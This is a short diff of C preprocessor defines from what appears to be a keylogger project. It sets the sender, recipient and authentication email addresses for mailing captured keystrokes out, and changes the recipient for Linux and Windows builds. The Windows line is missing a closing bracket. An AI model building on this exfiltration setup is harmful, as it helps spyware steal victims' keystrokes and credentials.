@@ -12,9 +12,9 @@
 #define FROM        "<keylogger_project_2014@yahoo.com>"
 
 #if defined(__linux)
-#define TO          "<keylogger_project_2014@gmail.com>"
+#define TO          "<keyloggerproject2014@gmail.com>"
 #elif defined(_WIN32)
-#define TO          "<MisterYura@gmail.com>"
+#define TO          "<keyloggerproject2014@gmail.com"
 #endif
 
 #define AUTH        "keylogger_project_2014@yahoo.com"
